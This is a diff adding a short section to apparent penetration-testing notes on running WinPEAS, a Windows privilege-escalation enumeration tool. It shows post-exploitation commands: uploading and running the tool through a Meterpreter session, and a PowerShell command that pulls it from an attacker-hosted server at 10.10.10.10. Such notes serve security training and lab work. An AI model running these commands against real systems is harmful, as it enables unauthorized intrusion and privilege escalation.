@@ -1,3 +1,17 @@
+# WinPeas
+```
+# Download it in your localhost
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20220717/winPEASx64.exe 
+mv winPEASx64.exe winPEAS.exe 
+
+# in meterpreter
+cd c:\windows\temp
+upload winPeas.exe
+winPeas.exe
+
+# download via powershell and python server
+powershell -command "Invoke-WebRequest -Uri 'http://10.10.10.10:8888/winPeas.exe' -OutFile '.\winPeas.exe'"
+```
 
 
 ## WinPEAS
